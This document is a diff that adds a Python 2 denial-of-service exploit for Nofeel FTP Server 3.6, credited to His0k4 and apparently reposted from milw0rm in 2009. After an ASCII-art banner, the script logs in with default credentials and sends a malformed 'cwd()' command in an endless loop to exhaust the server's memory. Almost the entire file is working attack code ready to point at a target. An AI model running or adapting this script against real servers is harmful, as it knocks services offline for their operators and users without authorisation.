@@ -1,0 +1,64 @@
+#!/usr/bin/python
+#           
+#                  ------  |      ______ _____   (--, __*__  ______
+#                  |____|  |      |    | |       | ! )  |    |     |
+#                [ |    |` |      | <> | |-----> |__/   |    |     | ]
+#                  | .. |  |____! |____| |____   |\     |    |-----|
+#                                      |        _| \  -----  | ::: |
+#                                      |         |  \
+#                                |_____|         |   \
+#                                                |
+#                                                |
+#                                               ,|.
+#                                              / | \
+#                                             |  |  |
+#                                             |  _  |
+#                                           `._\/.\/_,'
+#                                             _( 8 )_
+#                                            / '_ _' \
+#                                           |  /{_}\  |
+#                                           ` |  "  | `
+#                                             |     |
+#
+#
+# [+] Application :		Nofeel FTP Server V3.6
+#
+# [+] Vendor URL :		http://www.nftpserver.com/
+#
+# [+] Bug :			Nofeel FTP Server (CWD) Remote Memory Consumption Exploit
+#
+# [+] Author :			His0k4
+#
+# [+] Greetings :		All friends & Muslims Hackers (dz)
+#				www.snakespc.com
+#---------------------------------------------------------------------------------
+
+import socket
+import struct
+import time
+
+try:
+	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	print "\n[*] Nofeel FTP Server Remote Memory Consumption Exploit"
+	print "[*] Author:  His0k4\r\n"
+	connect=s.connect(('127.0.0.1',21))
+	s.recv(1024)
+	print "[*] Sending Username"
+	time.sleep(1)
+	s.send('USER test\r\n')
+	s.recv(1024)
+	print "[+] Sending Password"
+	time.sleep(1)
+	s.send('PASS ftp\r\n')
+	s.recv(1024)
+	print "[*] Sending evil command"
+	time.sleep(1)
+	while (1):
+		s.send('cwd()\r\n')
+		s.recv(1024)
+	s.send('quit\r\n')
+	s.recv(1024)
+except:
+	print "Can't connect to ftp"
+
+# milw0rm.com [2009-01-13]
